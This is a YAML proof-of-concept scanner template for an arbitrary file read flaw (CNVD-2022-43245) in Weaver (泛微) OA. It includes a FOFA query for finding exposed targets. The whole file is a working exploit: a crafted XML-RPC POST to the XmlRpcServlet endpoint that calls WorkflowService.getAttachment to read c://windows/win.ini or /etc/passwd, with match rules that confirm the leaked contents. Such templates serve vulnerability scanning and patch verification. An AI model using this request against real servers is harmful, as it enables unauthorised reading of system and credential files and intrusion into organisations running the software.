id: poc-yaml-weaver-oa-xmlrpcservlet-anyfile-read
info:
  name: 泛微OA XmlRpcServlet 任意文件读取漏洞(CNVD-2022-43245)
  severity: high
  tags:
  - CNVD-2022-43245
  - 两高一弱
  finger: e-office
  fofa: app="泛微-OA（e-cology）"
variables:
  file: 'c://windows/win.ini

    /etc/passwd'
requests:
- method: POST
  path: /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet
  headers:
    Content-Type: application/xml
  data: '<?xml version="1.0" encoding="UTF-8"?><methodCall>

    <methodName>WorkflowService.getAttachment</methodName>

    <params><param><value><string>{{.file}}</string>

    </value></param></params></methodCall>'
  expression: ( status_code == 200 && contains(body,"<base64>") && contains(headers,"text/xml")
    ) && ( contains(body,"OyBmb3Ig") || contains(body,"Oi9iaW4v") )
transport: http
